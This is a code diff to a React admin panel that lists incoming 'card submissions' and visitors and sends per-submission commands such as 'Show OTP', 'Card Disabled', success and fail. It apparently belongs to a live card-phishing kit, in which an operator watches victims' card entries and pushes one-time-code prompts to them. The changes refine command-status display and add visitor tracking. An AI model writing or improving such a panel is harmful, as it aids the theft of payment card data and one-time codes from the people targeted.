@@ -1,3 +1,4 @@
+
 import React, { useState, useEffect, useMemo } from 'react';
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from './ui/table';
 import { wsClient } from '@/integrations/ws-client';
@@ -36,8 +37,6 @@ const AdminPanel = () => {
   const { isAuthenticated, loading, logout } = useAdminAuth();
   const [cardSubmissions, setCardSubmissions] = useState<CardSubmission[]>(() => {
     const savedSubmissions = localStorage.getItem('card_submissions');
-    const savedCommands = localStorage.getItem('admin_commands');
-    const initialCommands = savedCommands ? JSON.parse(savedCommands) : {};
     let parsedSubmissions: CardSubmission[] = [];
     try {
       parsedSubmissions = savedSubmissions ? JSON.parse(savedSubmissions) : [];
@@ -45,10 +44,9 @@ const AdminPanel = () => {
       console.error("Failed to parse card submissions from localStorage", e);
     }
     
-    // Filter out submissions that have already been commanded
     return parsedSubmissions.map(submission => ({
       ...submission,
-      isNew: !(initialCommands[submission.id] && initialCommands[submission.id].length > 0)
+      isNew: false // Initialize as false, will be set to true only for new submissions
     }));
   });
   const [visitors, setVisitors] = useState<Visitor[]>([]);
@@ -77,6 +75,18 @@ const AdminPanel = () => {
   const showNotification = (message: string) => {
     setNotification(message);
     setTimeout(() => setNotification(''), 3000);
+  };
+
+  // Check if a submission has been commanded (has any commands)
+  const hasBeenCommanded = (submissionId: string) => {
+    return adminCommands[submissionId] && adminCommands[submissionId].length > 0;
+  };
+
+  // Check if a submission should show command buttons (not commanded with final commands)
+  const shouldShowCommands = (submissionId: string) => {
+    const commands = adminCommands[submissionId] || [];
+    const finalCommands = ['success', 'fail'];
+    return !commands.some(cmd => finalCommands.includes(cmd));
   };
 
   useEffect(() => {
@@ -345,6 +355,9 @@ const AdminPanel = () => {
         />
       )}
 
+      {/* Enhanced Visitor Info Component */}
+      <EnhancedVisitorInfo />
+
       {/* Notifications */}
       {notification && (
         <div className="fixed top-4 right-4 bg-blue-600 text-white px-4 py-2 rounded-lg shadow-lg">
@@ -376,8 +389,12 @@ const AdminPanel = () => {
             {cardSubmissions.map((submission) => (
               <div
                 key={submission.id}
-                className={`bg-gray-700 rounded-lg p-4 ${submission.isNew ? 'animate-pulse border-2 border-yellow-500' : ''}`}
-                onClick={() => setSelectedSubmissionId(submission.id)}
+                className={`bg-gray-700 rounded-lg p-4 ${
+                  submission.isNew && !hasBeenCommanded(submission.id) 
+                    ? 'animate-pulse border-2 border-yellow-500' 
+                    : ''
+                }`}
+                onClick={() => handleRowClick(submission.id)}
               >
                 <div className="grid grid-cols-2 gap-4 mb-4">
                   <div className="col-span-2">
@@ -443,8 +460,8 @@ const AdminPanel = () => {
                   </div>
                 </div>
 
-                {/* Action Buttons */}
-                {!(adminCommands[submission.id]?.includes('success') || adminCommands[submission.id]?.includes('fail')) && (
+                {/* Action Buttons - Only show for submissions that haven't been commanded with final commands */}
+                {shouldShowCommands(submission.id) && (
                   <div className="grid grid-cols-2 gap-2 mb-4">
                     <button
                       onClick={(e) => { e.stopPropagation(); handleShowOtp(submission.id); }}
@@ -482,6 +499,15 @@ const AdminPanel = () => {
                     >
                       Card Disabled
                     </button>
+                  </div>
+                )}
+
+                {/* Show status for commanded submissions */}
+                {hasBeenCommanded(submission.id) && (
+                  <div className="mt-4 p-2 bg-gray-600 rounded">
+                    <span className="text-sm text-gray-300">
+                      Commands sent: {adminCommands[submission.id].join(', ')}
+                    </span>
                   </div>
                 )}
               </div>
